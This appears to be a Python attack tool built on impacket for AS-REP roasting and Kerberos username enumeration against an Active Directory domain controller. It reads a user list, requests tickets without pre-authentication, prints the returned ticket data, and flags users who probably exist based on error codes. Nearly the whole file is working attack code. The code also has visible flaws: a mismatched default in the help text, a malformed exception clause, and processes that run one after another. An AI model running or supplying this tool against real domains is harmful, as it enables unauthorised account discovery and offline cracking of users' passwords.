from queue import Queue
import time as t
from multiprocessing import Process
import argparse
from impacket import version
from impacket.examples import logger
from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError, SessionKeyDecryptionError
from impacket.krb5 import constants
from impacket.krb5.types import Principal
from impacket.krb5.ccache import CCache
from impacket.ldap import ldap, ldapasn1, ldaptypes
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
from impacket.krb5.kerberosv5 import sendReceive, KerberosError, SessionError
from impacket.krb5.types import KerberosTime, Principal
import sys
try:
    from utils.adconn import LdapConn
    from utils.tickets import TGT, TGS
except:
    sys.path.insert(0, './utils')
    from adconn import LdapConn
    from tickets import TGT, TGS



def build_queue(file:str) -> Queue:
    objs = open(file, 'r').readlines()
    q = Queue()
    for obj in objs:
        obj = obj.strip()
        q.put(obj)
    return q



def get_user(user, domain, dc):
    T = TGT(domain, user, dc, preauth=False)
    tgt_data = T.run()
    tgt = tgt_data['tgt']
    cipher = tgt_data['cipher']
    old = tgt_data['oldSessionKey']
    new = tgt_data['newSessionKey']
    TS = TGS(tgt, domain, cipher, old, new, user, dc, preauth=False)
    tgs = TS.run()
    return tgs



def run(domain, dc, delay):
    while not q.empty():
        user = q.get()
        try:
            tgs = get_user(user,domain,dc)
            print(tgs)
        except Exception as e:
            try:
                code = e.getErrorCode()
                if code !=6:
                    print(f'[+] maybe found user: {user}')
            except:
                None
            # # if e == SessionError:
            # #     print(f'[+] Found user: {user}')
            # print(e)
            # print(e.getErrorCode())
            # #print(KerberosError.getErrorCode())
        finally:
            t.sleep(delay)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()

    art = r"""
    ⠀⠀⠀⠀⠀⠀⢎⠉⠁⠈⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠞⠋⠙⠛⠛⠢⠤⣀⠰⠗⠒⠂⣀⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⡀⠀⠀⠀⢀⡤⠖⢒⣛⣓⣦⣀⡴⢋⠭⠿⠿⣦⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠿⠀⠀⠀⢨⠤⠞⠉⠀⢀⠉⠻⣗⠁⠀⢸⣷⣌⠻⡆
⠀⠀⠀⠀⠀⠀⠀⣠⠔⠉⠀⠀⠀⠀⠈⢦⠀⠀⢰⣿⣷⡀⠸⡀⠀⠘⣿⣼⠆⢱
⠀⠀⠀⢀⡤⠒⠉⠀⠀⠀⠀⠀⠀⠀⠀⡿⡀⠀⣼⣧⡾⠀⢠⡧⣀⣀⣬⠥⣖⡥
⠀⣠⠜⠁⠀⠀⣀⡴⠤⣄⠀⠀⢰⡄⠀⢧⡳⠤⣌⣡⣤⡴⠛⠳⣄⣉⡩⠝⠋⢁
⡔⠁⠀⠀⠀⡼⢩⣧⡀⠘⢦⡀⠀⠉⠓⠲⠿⠛⠛⠉⠁⠀⠀⠀⠈⠏⠀⢀⣠⣺
⡇⠀⠀⠀⠀⢧⠈⢷⣙⣶⣄⡉⠓⠢⠤⣀⣀⣀⣀⣀⣀⣀⣠⣤⣤⣶⡾⢿⣿⠁
⠱⡀⠀⠀⠀⠈⢦⡈⠻⢝⡛⠿⣿⣓⠒⠶⠶⠾⠿⣿⣟⠛⠋⠉⠉⣹⣦⡿⠁⠀
⠀⠘⢆⠀⠀⠀⠀⠙⠢⣄⡉⠑⠒⠭⠿⠶⠶⣶⣞⣫⣥⣤⢖⡾⠿⠟⠋⠀⠀⠀
⠀⠀⠀⠑⠀⢀⡀⠀⠀⠀⠉⠉⠓⠒⠒⠒⠛⣉⣉⠉⣃⡦⠋⠀⠀⠀⠀⠀⠀⠀


"""

    parser.description = f"""This tool is for asrep roasting multiple users that don't require preauth"""
    parser.prog = art
    try:
        parser.add_argument('-user_file', help="the user file for user to be enumerated")
        parser.add_argument('-domain', help='the target domain')
        parser.add_argument('-dc', help='the domain controller')
        parser.add_argument('-processes', default=1, help='the number of processes, defailt is 3', type=int)
        parser.add_argument('-delay', help='add a delay in between requests', default=0.1, type=float)

        options = parser.parse_args()
        f = options.user_file
        domain = options.domain
        dc = options.dc
        delay = options.delay
        q = build_queue(f)
        processes = options.processes

        for process in range(processes):
            p = Process(target=run, args=(domain, dc, delay,))
            p.start()
            p.join()
    except not KeyboardInterrupt:
        parser.print_help()
    
